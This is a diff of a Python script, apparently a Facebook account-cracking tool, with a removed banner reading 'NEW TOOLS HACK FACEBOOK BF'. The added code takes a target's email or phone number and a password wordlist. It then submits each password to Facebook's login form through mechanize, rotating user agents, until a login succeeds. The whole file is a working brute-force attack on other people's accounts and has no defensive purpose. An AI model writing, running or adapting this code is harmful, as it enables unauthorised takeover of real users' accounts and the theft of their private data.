@@ -1,4 +1,68 @@
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
 
+import sys
+import mechanize
+import cookielib
+import random
+
+
+
+
+email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
+
+
+passwordlist = str(raw_input("Enter the wordlist name and path : "))
+
+
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+
+
+useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+def main():
+	global br
+	br = mechanize.Browser()
+	cj = cookielib.LWPCookieJar()
+	br.set_handle_robots(False)
+	br.set_handle_redirect(True)
+	br.set_cookiejar(cj)
+	br.set_handle_equiv(True)
+	br.set_handle_referer(True)
+	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+	welcome()
+	search()
+	print("Password does not exist in the wordlist")
+
+	
+	
+def brute(password):
+	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
+	sys.stdout.flush()
+	br.addheaders = [('User-agent', random.choice(useragents))]
+	site = br.open(login)
+	br.select_form(nr = 0)
+	br.form['email'] = email
+	br.form['pass'] = password
+	sub = br.submit()
+	log = sub.geturl()
+	if log != login and (not 'login_attempt' in log):
+			print("\n\n[+] Password Find = {}".format(password))
+			raw_input("ANY KEY to Exit....")
+			sys.exit(1)
+
+			
+def search():
+	global password
+	passwords = open(passwordlist,"r")
+	for password in passwords:
+		password = password.replace("\n","")
+		brute(password)
+
+		
+#welcome 
+def welcome():
+	wel = """
 ██╗░░██╗███████╗███╗░░██╗██╗░░░░░███████╗██╗░░██╗
 ██║░██╔╝██╔════╝████╗░██║██║░░░░░██╔════╝╚██╗██╔╝
 █████═╝░█████╗░░██╔██╗██║██║░░░░░█████╗░░░╚███╔╝░
@@ -44,45 +108,16 @@
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⡄⠈⠙⢿⣿⣿⣿⣿⠟⠋⣁⣤⠴⠚⠉⠁⠀⠀⠀⠀⠀⠀⠉⠲⢤⡀⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⡄⠀⠀⢙⣹⣷⠶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦⣄⠀⠀⠀⠀⠀⠀⠀⠰⢚⡇⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⡾⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-# Mod by: MR.KENLEX
-# team: life of programmer
 
+"""
+	total = open(passwordlist,"r")
+	total = total.readlines()
+	print wel 
+	print " [*] Account to crack : {}".format(email)
+	print " [*] Loaded :" , len(total), "passwords"
+	print " [*] Cracking, please wait ...\n\n"
 
-import os
-import sys
-import time
-import random
-import cookielib
-import mechanize
+	
+if __name__ == '__main__':
+	main()
 
-wd = "\033[90;1m" # dark
-GL = "\033[96;1m" # Blue aqua
-BB = "\033[34;1m" # Blue light
-YY = "\033[33;1m" # Yellow light
-GG = "\033[32;1m" # Green light
-WW = "\033[0;1m"  # White light
-RR = "\033[31;1m" # Red light
-CC = "\033[36;1m" # Cyan light
-B = "\033[34m"    # Blue
-Y = "\033[33;1m"    # Yellow
-G = "\033[32m"    # Green
-W = "\033[0;1m"     # White
-R = "\033[31m"    # Red
-C = "\033[36;1m"    # Cyan
-
-def banner():
-    os.system('clear')
-    print " "
-    print GG+"  √=============================================√"
-    print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
-    print GG+"  √=============================================√"
-    print WW+"  |            MOD BY: MR.KENLEX            |
-    print WW+"  |        TEAM :PHILIPPINES CYBER ErRoR SyStEm        >
-    print Y+"  |             INSTAGRAM: systemss_Error              |"
-    print GL+"  |---------------------------------------------|"
-    print GL+"  |        LIFE OF PROGRAMMER [ U.D.C ]         |"
-    print GL+"  |---------------------------------------------|"
-    print GG+"  √=============================================√"
-    print GL+"  |•••••••••   HACK FACEBOOK TLS^_^   •••••••••|"
-    print GG+"  √=============================================√"
